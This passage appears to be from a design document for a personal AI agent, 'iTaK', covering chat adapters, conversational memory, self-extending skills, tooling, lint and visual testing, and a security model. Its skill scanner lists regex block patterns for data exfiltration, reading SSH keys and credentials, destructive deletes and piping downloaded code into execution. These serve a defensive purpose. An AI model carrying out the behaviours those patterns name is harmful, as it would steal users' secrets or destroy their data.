Not the expensive chat model. Background processing should be cost-efficient.

---

## §6 - Adapters - Talk to iTaK From Anywhere

Stolen from: **OpenClaw (architecture) + Cole Medin (just pick one) + Nanobot (Telegram pattern)**

All 4 adapters are first-class citizens. Same agent, same memory, same tools - just different front doors.

### Discord (your daily driver)

```python
# Socket Mode - no public URL needed
# Each thread = persistent conversation
# Can switch projects mid-thread (Agent Zero pattern)
```

- Uses your existing Discord bot (NANO bot token in creds)
- Thread-based conversations for parallel work
- Rich formatting (embeds, code blocks, images)
- Slash commands for common operations
- `/remember` slash command for quick memory captures

### Telegram

Stolen from: **Nanobot** (proven Telegram integration pattern)

```python
# python-telegram-bot library (async, webhook or polling)
# Each chat = persistent conversation
# Inline keyboards for confirmations
```

- Best for mobile-first interaction (phone always on you)
- Supports inline keyboards for quick confirmations ("Save this? Yes/No")
- Voice message transcription → agent processes spoken input
- Image/file sharing built into Telegram API
- Great for quick notes: *"Remember this: the Docker config needs port 8443"*

### Slack

```python
# Slack Bolt SDK (Socket Mode - no public URL needed)
# Each channel/thread = conversation context
# App Home tab for status dashboard
```

- Ideal for workspace/team context (if collaborating with others)
- Thread-based conversations (same pattern as Discord)
- Slack Blocks for rich interactive messages
- App Home tab → iTaK status dashboard (heartbeat, recent memories, active tasks)
- `/iTaK remember` slash command built-in

### Terminal / CLI

```bash
# Direct interaction when on desktop
iTaK chat "What's the status of the Polymarket bot?"
iTaK heartbeat  # Trigger manual heartbeat check
iTaK remember "The VPS password was changed to X"
```

### Adapter Architecture

```python
# Every adapter implements the same interface
class Adapter:
    name: str                                        # "discord", "telegram", "slack", "cli"
    async def receive_message(self, msg) -> str       # Incoming message
    async def send_response(self, response) -> None   # Reply to user
    async def send_notification(self, note) -> None   # Proactive push (heartbeat alerts)
    async def handle_remember(self, context) -> None  # "Remember this" handler
    def get_conversation_id(self, msg) -> str          # Thread/chat ID for history

# All adapters feed into the same agent loop
# Memory is shared - tell iTaK something on Telegram, ask about it on Discord
```

### Cross-Adapter Memory

Say something on Telegram → iTaK remembers → ask about it on Discord → it knows. All adapters write to the same 4-layer memory system. Conversation histories are tagged by adapter + thread ID for context.

---

## §7 - "Remember This" - Conversational Memory Capture

> The ability to say **"remember this"** during any conversation and have iTaK intelligently capture, summarize, and store what you're talking about.

### How It Works

```
User: "We just spent 2 hours figuring out that the Neo4j APOC plugin
       needs to be version-matched to the Neo4j server version.
       Remember this."

iTaK:
1. Grabs the recent conversation context (last N messages)
2. Sends context to utility model with summarization prompt:
   "Summarize the key insight, decision, or fact the user wants
    to remember. Be specific and actionable."
3. Stores the summary in ALL 4 memory layers:
   - MEMORY.md → appends under today's date
   - SQLite → indexed + embedded for search
   - Neo4j → creates entity nodes + relationships
   - Weaviate → vector-embedded for semantic retrieval
4. Confirms: "Got it. Saved: 'Neo4j APOC plugin must be version-matched
   to the Neo4j server version. Mismatched versions cause silent failures.'"
```

### Trigger Patterns

The agent listens for natural language triggers - no rigid commands needed:

| Trigger | Action |
|---------|--------|
| "remember this" | Summarize recent context → store |
| "remember that..." | Store the specific thing mentioned |
| "save this" / "note this" | Same as "remember this" |
| "don't forget..." | Store with HIGH priority flag |
| "this is important" | Store with HIGH priority + notify on next heartbeat |
| `/remember` (slash command) | Explicit command in Discord/Slack |
| `iTaK remember "..."` | CLI explicit memory save |

### What Gets Stored

```python
# Memory entry structure
{
    "id": "mem_2026-02-12_001",
    "timestamp": "2026-02-12T12:35:00-05:00",
    "source_adapter": "discord",           # Where the conversation happened
    "source_thread": "thread_abc123",      # Thread/chat ID for context
    "trigger": "remember this",            # What triggered the save
    "raw_context": [                        # Last N messages for provenance
        {"role": "user", "content": "..."},
        {"role": "assistant", "content": "..."},
        ...
    ],
    "summary": "Neo4j APOC plugin must be version-matched...",
    "entities": ["Neo4j", "APOC", "VPS"],  # Extracted for Neo4j graph
    "priority": "normal",                   # normal | high | critical
    "tags": ["infrastructure", "database", "debugging"]
}
```

### Storage Pipeline

```
"Remember this"
     │
     ▼
┌──────────────────────┐
│  Context Extraction  │  ← Grab last 10–20 messages from current thread
└──────────┬───────────┘
           │
     ▼
┌──────────────────────┐
│  LLM Summarization   │  ← Utility model (cheap): extract key insight
│  + Entity Extraction │  ← Pull out people, projects, tools, concepts
│  + Tag Generation    │  ← Auto-categorize: "infrastructure", "security", etc.
└──────────┬───────────┘
           │
     ▼ (parallel writes)
┌─────────┐  ┌──────────┐  ┌─────────┐  ┌──────────┐
│Markdown │  │  SQLite  │  │  Neo4j  │  │ Weaviate │
│MEMORY.md│  │  index + │  │ entities│  │  vector  │
│ append  │  │  embed   │  │ + rels  │  │  embed   │
└─────────┘  └──────────┘  └─────────┘  └──────────┘
           │
     ▼
┌──────────────────────┐
│  Confirmation Reply  │  ← "Got it. Saved: [summary]"
└──────────────────────┘
```

### Neo4j Graph from "Remember This"

When you say "remember this" about Neo4j APOC versions, iTaK creates:

```
(Memory:"APOC version matching")-[:ABOUT]->(Neo4j)
(Memory:"APOC version matching")-[:ABOUT]->(APOC)
(Memory:"APOC version matching")-[:LEARNED_ON]->(Date:"2026-02-12")
(Memory:"APOC version matching")-[:CONTEXT]->(Project:"iTaK")
(Neo4j)-[:HAS_PLUGIN]->(APOC)
(APOC)-[:REQUIRES]->(VersionMatch:"server version")
```

Now when you later ask *"What do I know about Neo4j gotchas?"*, the graph traversal finds this memory through the relationship chain - not just keyword matching.

### Implicit Memory (Auto-Remember)

Beyond explicit "remember this" commands, iTaK also auto-detects things worth remembering:

- **Decisions**: "Let's go with Weaviate instead of Qdrant" → auto-saved
- **Preferences**: "I prefer dark mode" → updates `USER.md`
- **Corrections**: "Actually, the port is 8443 not 8080" → updates existing memory
- **New facts about you**: "I started a new project called X" → updates `USER.md` + Neo4j

This runs as an extension hook (`message_loop_end/auto_remember.py`) - the utility model scans each conversation turn for memory-worthy content. Lightweight, cheap, always on.

### Forget This (Reverse of Remember This)

Mirror of "Remember this" - deletes a specific memory from all 4 layers.

**Triggers:** "forget this", "delete that memory", "I was wrong about...", "never mind about..."

**Flow:**
1. Detect forget-intent → extract what to forget
2. Search all 4 memory tiers for matching content
3. Show the user what was found: "I found 2 matches. Delete both?"
4. On confirmation → delete from Markdown, SQLite, Neo4j, and Weaviate
5. Log the deletion in the audit trail (§20 Logging)

```python
async def forget_this(query: str, user: User) -> str:
    """Delete a memory from all tiers."""
    matches = await memory.search_all_tiers(query)
    if not matches:
        return "I couldn't find any memories matching that."

    # Confirm with user before deletion
    confirmation = await ask_user(
        f"Found {len(matches)} matches:\n" +
        "\n".join(f"- {m.summary}" for m in matches) +
        "\nDelete all?"
    )
    if confirmation.lower() in ("yes", "y", "delete"):
        for match in matches:
            await memory.delete(match.id, match.tier)
        await log.audit("memory_forget", user=user, deleted=matches)
        return f"Deleted {len(matches)} memories."
    return "Cancelled - nothing deleted."
```

---

## 8  Skills  Memory-First Self-Extending Capabilities

Stolen from: **Agent Zero + Nanoclaw + Cole Medin** + **David's requirement: always check memory first**

### Skill = A Single Markdown File

```
skills/
├── SKILL.md                    # Meta-skill: how to create more skills
├── code_execution.md           # Run Python/Node/Shell
├── web_research.md             # Search + scrape patterns
├── polymarket_trading.md       # Trading strategies + API usage
├── content_creation.md         # YouTube scripts, blog posts
├── diagram_generation.md       # Excalidraw, Mermaid diagrams
├── docker_management.md        # Container operations
├── neo4j_queries.md            # Graph database patterns
└── ...
```

### Memory-First Skill Discovery Pipeline

> **RULE: iTaK always checks its own brain before building anything new.**

When iTaK needs a skill or tool it doesn't have loaded, it follows this strict priority chain:

```
User: "iTaK, I need you to generate PowerPoint presentations."

Step 1: CHECK LOCAL SKILLS DIRECTORY
        └── Does skills/powerpoint_generation.md exist?
            └── YES → Load and use it
            └── NO  → Continue to Step 2

Step 2: CHECK NEO4J KNOWLEDGE GRAPH
        └── MATCH (s:Skill)-[:ABOUT]->(:Topic {name: "PowerPoint"})
            RETURN s
        └── FOUND → Copy skill definition from graph to local skills/
                    → Validate with security scanner (§9)
                    → Load and use it
        └── NOT FOUND → Continue to Step 3

Step 3: CHECK INTERNAL MEMORY (SQLite + Weaviate)
        └── Semantic search: "powerpoint generation", "pptx", "slides"
        └── FOUND relevant knowledge → Use as foundation to build skill
        └── NOT FOUND → Continue to Step 4

Step 4: RESEARCH ONLINE
        └── SearXNG search + browser scraping for best practices
        └── Cross-reference with SECURITY SCANNER (§9)
        └── Build custom skill from research

Step 5: BUILD, VALIDATE, STORE
        └── Create skill markdown file
        └── RUN SECURITY SCAN (mandatory - see §9)
        └── Test the skill
        └── Store in local skills/ directory
        └── Store in Neo4j graph for future retrieval:
            (Skill:"PowerPoint Generation")-[:USES]->(Library:"python-pptx")
            (Skill:"PowerPoint Generation")-[:CREATED_ON]->(Date:"2026-02-12")
            (Skill:"PowerPoint Generation")-[:CREATED_FOR]->(User:"David")
        └── Store embedding in Weaviate for semantic search
```

### Why Memory-First Matters

- **No duplicate work**: If you taught iTaK something 3 months ago, it finds it via Neo4j graph traversal
- **Cross-session learning**: Skills built in one conversation are available in all future conversations
- **Knowledge accumulation**: The graph grows richer over time - iTaK gets smarter, not just bigger
- **Faster responses**: Local lookup = instant. Web research = slow. Always try local first.

### Neo4j Skill Graph Structure

```
(Skill:"Docker Management")-[:USES]->(Tool:"docker-compose")
(Skill:"Docker Management")-[:REQUIRES]->(Prereq:"Docker Engine")
(Skill:"Docker Management")-[:RELATED_TO]->(Skill:"VPS Deployment")
(Skill:"Docker Management")-[:SECURITY_STATUS]->(Status:"VERIFIED")
(Skill:"Docker Management")-[:LAST_USED]->(Date:"2026-02-10")
(Skill:"Docker Management")-[:VERSION]->(Version:"1.2")
```

This means iTaK can answer: *"What skills do I have that use Docker?"* or *"Show me all skills related to deployment"* - relationship queries, not just keyword search.

### The Meta-Skill Pattern (from Cole Medin + Nanoclaw)

iTaK has a skill that teaches it how to create new skills. The meta-skill includes:
- How to format a skill markdown file
- The memory-first discovery pipeline (check Neo4j first!)
- The security validation checklist (mandatory before activation)
- How to test a newly created skill
- How to store it in Neo4j for future retrieval

### Self-Modification Pattern (from Nanoclaw)

If iTaK doesn't have a feature, ask it to build it:

> "iTaK, add the ability to send images in Discord."

The agent modifies its own code, creates the tool, and after restart it works. This is possible because the codebase is small enough (~3,500 lines target) for the agent to understand entirely.

> **Security gate**: All self-modifications go through the security scanner before activation. iTaK will not install code that fails the security audit.

### OS Command Skills - Know Every System

> **iTaK ships with complete command references for all 3 operating systems. At first launch, it detects the OS and stores the result in memory so it always uses the right commands.**

**The problem with OpenClaw:** It runs in a Docker sandbox (Linux) but doesn't always know that. It tries Windows commands inside Linux containers, or uses bash syntax on a PowerShell host. This causes silent failures and confusion.

**iTaK's solution:**

```
skills/
├── os_linux.md     # Every Linux/Bash command it needs
├── os_macos.md     # macOS-specific commands (brew, defaults, etc.)
├── os_windows.md   # Windows/PowerShell commands
```

**First-Launch OS Detection:**

```python
# At first boot (extension: agent_init/os_detect.py):
import platform
import subprocess

os_info = {
    "system": platform.system(),       # "Linux", "Darwin", "Windows"
    "release": platform.release(),     # "5.15.0-91-generic", "23.2.0", "10"
    "machine": platform.machine(),     # "x86_64", "arm64"
    "in_docker": os.path.exists("/.dockerenv"),
    "shell": os.environ.get("SHELL", "unknown"),
}

# Store in memory immediately:
memory_save("OS_INFO", os_info)

# Also log which skill file to use:
if os_info["system"] == "Linux":
    memory_save("OS_SKILL_FILE", "skills/os_linux.md")
elif os_info["system"] == "Darwin":
    memory_save("OS_SKILL_FILE", "skills/os_macos.md")
elif os_info["system"] == "Windows":
    memory_save("OS_SKILL_FILE", "skills/os_windows.md")
```

**Sandbox Awareness (critical - what OpenClaw gets wrong):**

iTaK executes code in a **Docker sandbox (Linux)**. But it might be talking to a user on **Windows** or **macOS**. So it needs to track BOTH:

```python
# iTaK knows TWO environments:
EXECUTION_ENV = "Linux"     # Where code_execution runs (Docker sandbox)
HOST_ENV = "Windows"        # Where the user is (detected at first launch)

# This means:
# - When iTaK runs code → use Linux commands (bash, apt, etc.)
# - When iTaK gives the user instructions → use Windows/Mac commands
# - When iTaK SSHes into the VPS → use Linux commands
# - When iTaK SSHes into iTaK mini PC → use Linux commands (Ubuntu)
```

**What's in each OS skill file:**

| Category | `os_linux.md` | `os_windows.md` | `os_macos.md` |
|----------|--------------|-----------------|---------------|
| **Package Manager** | `apt`, `pip` | `winget`, `choco`, `pip` | `brew`, `pip` |
| **File Operations** | `cp`, `mv`, `rm`, `find`, `chmod` | `Copy-Item`, `Move-Item`, `Remove-Item`, `Get-ChildItem` | `cp`, `mv`, `rm`, `find`, `chmod` |
| **Process Management** | `ps`, `kill`, `systemctl`, `journalctl` | `Get-Process`, `Stop-Process`, `Get-Service` | `ps`, `kill`, `launchctl` |
| **Networking** | `curl`, `wget`, `ss`, `ip`, `ufw` | `Invoke-WebRequest`, `netstat`, `Test-NetConnection` | `curl`, `wget`, `lsof`, `networksetup` |
| **Docker** | `docker`, `docker-compose` | `docker`, `docker-compose` | `docker`, `docker-compose` |
| **System Info** | `uname`, `lsb_release`, `df`, `free` | `Get-ComputerInfo`, `Get-WmiObject` | `uname`, `sw_vers`, `df` |
| **Text Processing** | `grep`, `sed`, `awk`, `jq` | `Select-String`, `-replace`, `ConvertFrom-Json` | `grep`, `sed`, `awk`, `jq` |
| **SSH** | `ssh`, `scp`, `rsync` | `ssh`, `scp` (OpenSSH built-in) | `ssh`, `scp`, `rsync` |

---

## §9 - Tool System - Dynamic & Unlimited

Stolen from: **Agent Zero** (dynamic loading) + **Agent Zero VPS tutorial** (paste docs → instant tool)

> [!NOTE]
> **From Agent Zero Transcripts (§0 Lesson #7):** Before using any CLI tool, run `--help` first. This closes the model training cutoff gap and prevents hallucinated flags. Bake this into iTaK's tool execution as a default pre-step. See also A0's `code_execution_tool.py` (496 lines) at `d:\.no\agent-zero\python\tools\code_execution_tool.py`.

### Built-in Tools

| Tool | Source | Description |
|------|--------|-------------|
| `code_execution` | Agent Zero | Python, Node.js, Shell via subprocess or SSH |
| `memory_load` | Agent Zero + OpenClaw | Search across all 4 memory layers |
| `memory_save` | Agent Zero + OpenClaw | Store new knowledge/facts/decisions |
| `web_search` | Nanobot + SearXNG | Search via SearXNG (on your VPS) |
| `browser_agent` | Agent Zero | AI-driven browser via browser-use + Playwright |
| `call_subordinate` | Agent Zero | Spawn specialized sub-agents |
| `response` | Agent Zero | Final response to user (only way to break loop) |
| `knowledge_tool` | OpenClaw/Nanobot | Save/query reusable knowledge files |

### Built-in Browser Agent (Shipped Out of the Box)

Stolen from: **Agent Zero** - uses the **`browser-use`** Python library wrapping **Playwright Chromium**.

This is NOT raw Playwright. It's a full AI browser agent with its own dedicated LLM model (the "browser model" from the 4-model architecture).

```python
# How Agent Zero's browser works under the hood:
browser_session = browser_use.BrowserSession(
    browser_profile=browser_use.BrowserProfile(
        headless=True,                    # No GUI needed
        disable_security=True,            # For internal automation
        accept_downloads=True,            # Download files to tmp/downloads
        executable_path=playwright_binary, # Auto-installed Chromium
        keep_alive=True,                  # Persistent session across tasks
        user_data_dir=unique_per_agent,   # Isolated per sub-agent
        extra_http_headers=config.headers, # Custom headers if needed
    )
)

# The browser agent has its own LLM (cheap/fast model)
# It sees the page, reasons about what to click, and executes
use_agent = browser_use.Agent(
    task=task,
    browser_session=browser_session,
    llm=agent.get_browser_model(),        # Dedicated browser model
    use_vision=True,                      # Screenshot-based understanding
    system_prompt="browser_agent.system.md",
)
```

**Key features:**
- **Dedicated browser model**: Uses a cheap, fast model (NOT the main chat model) - saves cost
- **Vision support**: Takes screenshots, understands page layout, clicks elements
- **Persistent sessions**: Login once → session stays alive for follow-up tasks
- **Secret masking**: Passwords passed from agent → browser-use are masked in logs
- **JS injection**: Custom `init_override.js` runs on every page (for cookie/consent handling)
- **Task-based**: Give it a natural language task → it figures out clicks/typing
- **Download handling**: Files save to `tmp/downloads` automatically

**Usage (how iTaK calls it):**
```json
{
  "tool_name": "browser_agent",
  "tool_args": {
    "message": "Open github.com/David2024patton and find the latest commit",
    "reset": "true"
  }
}
```

**Why this matters for iTaK:**
- Web research for self-healing (§11) - iTaK can browse StackOverflow to fix errors
- Skill discovery (§6) - browse documentation to learn new capabilities
- Heartbeat (§4) - check web dashboards, monitoring pages
- Task automation - fill forms, scrape data, take screenshots

### Dynamic Tool Creation (Agent Zero VPS pattern)

Paste API docs → agent saves as knowledge → agent can now use that API forever:
1. Paste Open Router docs → agent learns image generation
2. Paste Perplexity docs → agent gets deep research
3. Paste any API docs → instant new capability

### MCP Integration

Agent Zero checks MCP tools first, then falls back to local tools. This means iTaK can use any MCP server in the ecosystem.

### Secret Store (Agent Zero pattern - critical for security)

```python
# Agent sees: $OPEN_ROUTER_KEY
# Agent NEVER sees: sk-or-v1-abc123...
# Values never enter LLM context → never leaked to providers
```

---

## §10 - Code Quality Gate - Auto-Lint Everything

> **Every piece of code iTaK writes gets automatically linted and type-checked before it's considered done. No exceptions.**

### How It Works

```
iTaK writes code (via code_execution tool or self-modification)
     │
     ▼
┌──────────────────────────────────────────────────────────────┐
│  AUTO-LINT (extension hook: tool_execute_after/code_quality) │
│                                                              │
│  Detects file language → runs appropriate linters:           │
│                                                              │
│  Python:  ruff check + ruff format + mypy + bandit           │
│  JS/TS:   eslint + tsc --noEmit + eslint-plugin-security     │
│  Shell:   shellcheck                                         │
│  Docker:  hadolint                                           │
│  Any:     semgrep --config=auto (OWASP security rules)       │
└──────────────────┬───────────────────────────────────────────┘
                   │
             ▼
       Errors found?
       ├── YES → Feed errors back into agent loop:
       │         "Fix these lint errors: [errors]"
       │         Agent self-corrects → re-lint
       │         (max 3 passes, then escalate to user)
       └── NO  → ✅ Code is clean → proceed
```

### Linter Stack (Pre-installed in Docker Sandbox)

| Language | Linter (Style/Quality) | Type Checker | Security Scanner |
|----------|----------------------|-------------|------------------|
| Python | `ruff` (replaces flake8+isort+pycodestyle, blazing fast) | `mypy --strict` | `bandit` (common vulnerabilities) |
| JS/TS | `eslint` + Prettier | `tsc --noEmit` | `eslint-plugin-security` |
| Shell | `shellcheck` | - | built-in security rules |
| Docker | `hadolint` | - | built-in best practices |
| Any | `semgrep --config=auto` | - | OWASP Top 10, hardcoded secrets |

### Why `ruff` + `semgrep` Are the Power Combo

- **`ruff`**: Written in Rust, 10-100x faster than flake8. Handles style, imports, formatting, complexity. Runs in milliseconds even on large files.
- **`semgrep`**: Pattern-matching code scanner with pre-built rules for SQL injection, XSS, hardcoded secrets, insecure deserialization. Free for local use.
- Together, they cover **quality + security** in under 1 second per file.

### Integration Points

```
extensions/
├── tool_execute_after/
│   └── code_quality.py       # Runs linters after code_execution writes files
├── tool_execute_before/
│   └── lint_config.py         # Ensures linter configs exist in workspace
└── process_chain_end/
    └── quality_report.py      # Summary: "3 files written, 0 lint errors"
```

### Self-Healing Integration

Lint failures feed directly into the self-healing loop (§11):

1. Code written → lint fails → classified as "repairable" error
2. Error message (e.g., `ruff: F401 unused import`) sent back to agent
3. Agent fixes → re-lint → pass → done
4. If 3 passes fail, escalate to user with full lint report

### Docker Sandbox Setup

```dockerfile
# These are pre-installed in the code execution sandbox
RUN pip install ruff mypy bandit semgrep
RUN npm install -g eslint typescript
RUN apt-get install -y shellcheck
# hadolint binary from GitHub releases
```

The linters run **inside the Docker sandbox** alongside the code - no extra infrastructure needed.

---

## §11 - Visual Testing - Screenshot Every Feature

> **When iTaK builds a UI feature, it doesn't just run lint and call it done. It opens a browser, looks at the result, takes a screenshot, and sends it to you for approval.**

### The Visual Verification Loop

```
iTaK writes UI code (HTML, React, CSS, etc.)
     │
     ▼
┌──────────────────────────────────────────────────────────────┐
│  STEP 1: AUTO-LINT (§7.5)                                    │
│  ruff + eslint + semgrep → code quality verified             │
└──────────┬───────────────────────────────────────────────────┘
           │ (code is clean)
     ▼
┌──────────────────────────────────────────────────────────────┐
│  STEP 2: SPIN UP DEV SERVER                                  │
│  Detects framework → runs appropriate dev command:           │
│  - Static HTML → python -m http.server 8080                  │
│  - Vite/React → npm run dev                                  │
│  - Next.js → npm run dev                                     │
│  - Flask/FastAPI → uvicorn app:app                           │
└──────────┬───────────────────────────────────────────────────┘
           │
     ▼
┌──────────────────────────────────────────────────────────────┐
│  STEP 3: BROWSER-USE VISUAL CHECK                            │
│  Uses the built-in browser agent (§7) to:                    │
│  1. Open localhost:PORT in headless Chromium                  │
│  2. Wait for page load                                       │
│  3. Take full-page screenshot                                │
│  4. (Optional) Browser model does quick visual sanity check: │
│     "Does this page look broken? Missing elements? Errors?"  │
│  5. Take screenshots of multiple viewport sizes:             │
│     - Desktop (1920x1080)                                    │
│     - Tablet (768x1024)                                      │
│     - Mobile (375x812)                                       │
└──────────┬───────────────────────────────────────────────────┘
           │
     ▼
┌──────────────────────────────────────────────────────────────┐
│  STEP 4: SEND TO USER                                        │
│  Via whichever adapter they're talking on:                    │
│                                                              │
│  Discord → embed with screenshot image                       │
│  Telegram → photo message with caption                       │
│  Slack → image block with thread reply                       │
│  CLI → save to tmp/ and open in default viewer               │
│                                                              │
│  Message: "Here's the new [feature name]. Let me know if     │
│  you want any changes."                                      │
└──────────┬───────────────────────────────────────────────────┘
           │
     ▼
┌──────────────────────────────────────────────────────────────┐
│  STEP 5: USER FEEDBACK LOOP                                  │
│                                                              │
│  User can:                                                   │
│  ├── Reply with text: "Make the header blue"                 │
│  ├── Annotate the image (draw on it, circle things)          │
│  │   → iTaK receives annotated image via adapter           │
│  │   → Browser model analyzes annotations:                   │
│  │     "Red circle around navbar = user wants navbar changed" │
│  ├── Reply "looks good" / "approved" → iTaK continues      │
│  └── Reply "undo" → iTaK reverts to previous version       │
│                                                              │
│  iTaK applies feedback → re-screenshots → sends again      │
│  (Iterative until user approves)                             │
└──────────────────────────────────────────────────────────────┘
```

### How Image Annotation Works

When a user annotates a screenshot (draws circles, arrows, writes notes on the image):

1. **Discord/Telegram/Slack** all support image replies - user draws on the screenshot and sends it back
2. iTaK receives the annotated image via the adapter
3. The **browser model** (vision-capable) analyzes the image:
   - Detects circles, arrows, highlights → identifies which UI elements are targeted
   - Reads any handwritten/typed notes on the image
   - Generates a structured list of changes: `"Move the button 10px left"`, `"Change header color to blue"`
4. iTaK applies the changes → re-screenshots → sends back for approval

### What Triggers Visual Testing

| Trigger | Action |
|---------|--------|
| iTaK writes/modifies HTML, CSS, JSX, TSX, Vue, Svelte | Auto visual test |
| iTaK modifies a Flask/FastAPI template | Auto visual test |
| iTaK creates a new page/component | Auto visual test |
| User says "show me" or "what does it look like" | Manual visual test |
| iTaK modifies backend-only code (Python logic, DB queries) | Skip visual test |
| iTaK writes a CLI tool or script | Skip visual test |

### Multi-Viewport Responsive Check

```python
VIEWPORTS = {
    "desktop":  {"width": 1920, "height": 1080},
    "tablet":   {"width": 768,  "height": 1024},
    "mobile":   {"width": 375,  "height": 812},
}

# iTaK sends a carousel of all 3 screenshots:
# "Here's the new dashboard on desktop, tablet, and mobile."
```

### Extension Hook Integration

```
extensions/
├── tool_execute_after/
│   ├── code_quality.py        # Lint check (§7.5)
│   └── visual_test.py         # Screenshot + send (§7.6) ← NEW
└── process_chain_end/
    └── quality_report.py      # "3 files, 0 lint errors, 3 screenshots sent"
```

### Why This Matters

- **No more "it works on my machine"** - you SEE what iTaK built before it's done
- **Faster iteration** - annotate a screenshot instead of describing changes in words
- **Responsive by default** - iTaK checks desktop, tablet, AND mobile automatically
- **Zero extra work** - plugs into the existing browser agent and extension hooks

---

## §12 - Multi-Agent Delegation

Stolen from: **Agent Zero** (sub-agent chain with profiles)

### How It Works

```
Agent 0 (Orchestrator)
├── spawns Agent 1 as "researcher" → runs its own monologue loop
│   ├── spawns Agent 2 as "coder" → runs its own monologue loop
│   │   └── returns result to Agent 1
│   └── returns result to Agent 0
└── synthesizes final response
```

- Each sub-agent gets inherited context + specialized prompt profile
- Sub-agent monologue is independent - it reasons, uses tools, calls more sub-agents
- Results bubble back up the chain
- Topic is sealed when sub-agent completes (prevents history pollution)

### Prompt Profiles

```
profiles/
├── default.md          # General-purpose assistant
├── researcher.md       # Deep research, analysis
├── coder.md           # Code generation, debugging
├── trader.md          # Polymarket analysis (custom)
└── security_auditor.md # Security review
```

> *"Never delegate the full task to a subordinate of the same profile as you."* - Agent Zero system prompt

---

## §13 - Security Model - Defense in Depth

Stolen from: **Nanoclaw** (sandboxing) + **Agent Zero** (secret store) + **Cole Medin** (build your own) + **David's requirement: no skills/tools with security vulnerabilities**

> [!NOTE]
> **From Agent Zero Transcripts (§0 Lesson #6):** A0 v0.9.5 implements a two-store secrets system - Variable store (non-sensitive, visible to LLM) + Secret store (masked after save). Placeholders `{{secret_name}}` are replaced just before tool execution, never exposed to the LLM. Output scanning re-masks any leaked values. Full implementation at `d:\.no\agent-zero\python\helpers\secrets.py` (21KB). OpenClaw's security audit system is at `d:\.no\openclaw\src\security\audit.ts` (37KB).

### Core Principles

1. **Build your own = you control everything** (Cole Medin's core thesis)
2. **Secret store**: Agent sees variable names, never values (Agent Zero)
3. **Docker sandbox**: Code execution in isolated containers (Agent Zero + Nanoclaw)
4. **No public skill registry**: All skills local, no supply chain attacks (Cole Medin)
5. **No plain-text API keys**: Unlike OpenClaw's vulnerable architecture
6. **Rate limiting**: Prevent runaway token consumption
7. **Intervention system**: User can interrupt agent mid-execution (Agent Zero)
8. **Skill security scanner**: Every skill/tool vetted before activation (NEW)
9. **No outbound data exfiltration**: Skills cannot phone home or leak user data

### Skill & Tool Security Scanner

> **EVERY skill and tool - whether discovered from memory, built from scratch, or researched online - MUST pass the security scanner before activation. No exceptions.**

```python
# security/skill_scanner.py
class SkillSecurityScanner:
    """
    Scans skill/tool code and definitions for security vulnerabilities.
    Returns PASS, WARN, or BLOCK with details.
    """

    BLOCKED_PATTERNS = [
        # DATA EXFILTRATION
        r"webhook",                    # No webhooks sending data out
        r"requests\.post.*external",   # No POST to unknown external servers
        r"httpx?\.post",              # Catch all outbound POST variants
        r"socket\.connect",            # No raw socket connections
        r"paramiko\.SSHClient",        # No SSH to unknown hosts
        r"smtplib",                    # No silent email sending

        # CREDENTIAL THEFT
        r"os\.environ\.get.*KEY",      # No reading raw API keys
        r"open.*\.ssh",               # No reading SSH keys
        r"open.*credentials",          # No reading credential files
        r"keyring\.get",              # No system keychain access
        r"base64\..*encode.*key",     # No encoding/exfiltrating keys

        # SYSTEM COMPROMISE
        r"subprocess.*rm\s+-rf",       # No destructive commands
        r"shutil\.rmtree.*(/|\\)",    # No recursive deletes of system dirs
        r"os\.system.*curl.*\|",      # No pipe-from-internet execution
        r"eval\(.*input",             # No eval of user/external input
        r"exec\(.*requests",          # No exec of downloaded code
    ]

    WARN_PATTERNS = [
        r"requests\.get",              # Outbound GET - review but allow
        r"urllib",                     # URL access - review context
        r"tempfile",                   # Temp files - check cleanup
        r"threading\.Thread",         # Threads - check for background exfil
    ]

    ALLOWED_DOMAINS = [
        "api.openrouter.ai",           # LLM API
        "api.telegram.org",            # Telegram adapter
        "discord.com",                 # Discord adapter
        "slack.com",                   # Slack adapter
        "localhost", "127.0.0.1",     # Local services
        "192.168.0.*",                 # Local network (iTaK)
        # VPS IP added via config
    ]
```

### Security Scan Flow

```
New Skill/Tool Created or Discovered
     │
     ▼
┌──────────────────────────┐
│  STATIC PATTERN SCAN     │  ← Check code against BLOCKED_PATTERNS
│  (regex-based)           │
└──────────┬───────────────┘
           │
     ▼
┌──────────────────────────┐
│  LLM SECURITY REVIEW     │  ← Utility model analyzes intent:
│  (intent analysis)       │    "Does this code exfiltrate data?"
│                          │    "Does it access credentials?"
│                          │    "Could it be used maliciously?"
└──────────┬───────────────┘
           │
     ▼
┌──────────────────────────┐
│  NETWORK POLICY CHECK    │  ← Any outbound connections?
│                          │    Only ALLOWED_DOMAINS pass.
│                          │    Unknown domains = BLOCKED.
└──────────┬───────────────┘
           │
     ▼
┌──────────────────────────┐
│     RESULT                │
│  ✅ PASS → Activate       │
│  ⚠️ WARN → Log + Activate │
│  🚫 BLOCK → Reject + Log  │  ← Notify user why it was blocked
└──────────────────────────┘
```

### What Gets Blocked (Examples)

| Scenario | Detection | Action |
|----------|-----------|--------|
| Skill sends user data to external webhook | `webhook` pattern + unknown domain | 🚫 BLOCKED |
| Skill reads `.ssh/id_rsa` and encodes it | `open.*\.ssh` + `base64` | 🚫 BLOCKED |
| Skill POSTs conversation history to unknown API | `requests.post` + non-allowed domain | 🚫 BLOCKED |
| Skill downloads and `exec()`s remote code | `exec.*requests` pattern | 🚫 BLOCKED |
| Skill uses `requests.get` to fetch public docs | `requests.get` + known safe domain | ⚠️ WARN, allowed |
| Skill writes to local `skills/` directory | No blocked patterns | ✅ PASS |

### OpenClaw's Vulnerabilities We Avoid

| OpenClaw Problem | iTaK Solution |
|-----------------|-----------------|
| One-click RCE via OAuth token theft | No OAuth - direct Discord socket |
| ClawHub malicious packages | No public registry - local skills only + security scanner |
| Plain-text credential storage | Encrypted secret store |
| Full system access without sandbox | Docker-contained code execution |
| 430K lines nobody understands | ~3,500 target lines, fully auditable |
| Skills can phone home with user data | Outbound network policy - allowlist only |
| No security review of community skills | LLM + regex security scanner on every skill |

---

## §14 - LLM Steering Vectors (Tier 3 - Advanced)

Stolen from: **Hugging Face / Neuroscience-inspired research**

> Only applicable when running local open-source models on iTaK.

### What It Is

Inject concept vectors into hidden layer activations at inference time to modify personality without fine-tuning or prompts:

```python
# Hook at layer 15 of Llama 3.1 8B
def steering_hook(module, input, output):
    return output + coefficient * personality_vector

model.layers[15].register_forward_hook(steering_hook)
```

### iTaK Application

- **`SOUL.vec`** - Agent personality as an activation vector, not just text
- **Dynamic focus**: Crank up "analytical" for research, "creative" for brainstorming
- **Zero token cost**: Personality doesn't consume context window
